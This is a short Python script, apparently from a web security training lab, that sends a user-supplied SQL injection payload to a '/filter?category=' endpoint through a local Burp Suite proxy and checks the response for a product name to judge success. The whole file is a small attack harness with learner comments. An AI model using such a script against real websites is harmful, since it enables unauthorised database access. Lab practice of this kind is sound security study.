import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# so it can go through Burbsuite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Allows You to Execute Code When the File Runs as a Script, but Not When It’s Imported as a Module

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        #The %s token allows me to insert (and potentially format) a string. Notice that the %s token is replaced by whatever I pass to the string after the % symbol
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("[+] SQL injection Successful!")
    else:
        print("[-] SQL injection unsuccessful!")
    